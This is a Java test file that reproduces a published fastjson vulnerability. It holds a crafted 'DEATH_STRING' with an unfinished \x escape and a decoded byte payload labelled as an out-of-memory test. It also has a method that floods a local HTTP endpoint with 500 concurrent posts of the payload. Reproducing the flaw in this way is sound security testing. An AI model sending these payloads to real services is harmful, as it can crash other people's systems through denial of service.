package com.lpf.interview.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONException;

import java.net.URLDecoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static junit.framework.TestCase.assertEquals;
import static junit.framework.TestCase.assertTrue;

/**
 * fastJson【漏洞预警】
 * https://help.aliyun.com/noticelist/articleid/1060052050.html
 *
 * @author lipengfei
 * @date 2019-09-09 15:35
 **/
public class TestFastJson {
    private static final String DEATH_STRING = "{\"a\":\"\\x";
//    private static final String DEATH_STRING = "{\"id\":\"10143\\x";


    public static void main(String[] args) {
        try {
            String DEATH_STRING = "{\"a\":\"\\x";
            Object obj = JSON.parse(DEATH_STRING);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void test_OOM() throws Exception {

        String line = new String("[{\\x22a\\x22:\\x22a\\xB1ph.\\xCD\\x86\\xBEI\\xBA\\xC3\\xBCiM+\\xCE\\xCE\\x1E\\xDF7\\x1E\\xD9z\\xD9Q\\x8A}\\xD4\\xB2\\xD5\\xA0y\\x98\\x08@\\xE1!\\xA8\\xEF^\\x0D\\x7F\\xECX!\\xFF\\x06IP\\xEC\\x9F[\\x85;\\x02\\x817R\\x87\\xFB\\x1Ch\\xCB\\xC7\\xC6\\x06\\x8F\\xE2Z\\xDA^J\\xEB\\xBCF\\xA6\\xE6\\xF4\\xF7\\xC1\\xE3\\xA4T\\x89\\xC6\\xB2\\x5Cx]");
        line = line.replaceAll("\\\\x", "%");
        String decodeLog = URLDecoder.decode(line, "UTF-8");
        System.out.println(decodeLog);
        try {
            Object obj = JSON.parse(decodeLog);
            obj = JSON.parse(DEATH_STRING);
        } catch (Exception e) {
            assertEquals(e.getClass(), JSONException.class);
            assertTrue(e.getMessage().contains("invalid escape character \\x"));
        }
    }


    private static void testMutiThread() {
        ExecutorService threadPool = Executors.newFixedThreadPool(8);
        String url = "http://localhost:8080/apc/pool/getBaseLogByPage";
        String DEATH_STRING = "{\"id\":\"10143\\x";

        for (int i = 0; i < 500; i++) {
            threadPool.submit(() -> {
                String result = HttpClientUtil.doPost(url, DEATH_STRING, HttpClientUtil.CONTENT_TYPE_JSON);
                System.out.println("响应报文为：" + result);
            });
        }
    }
}
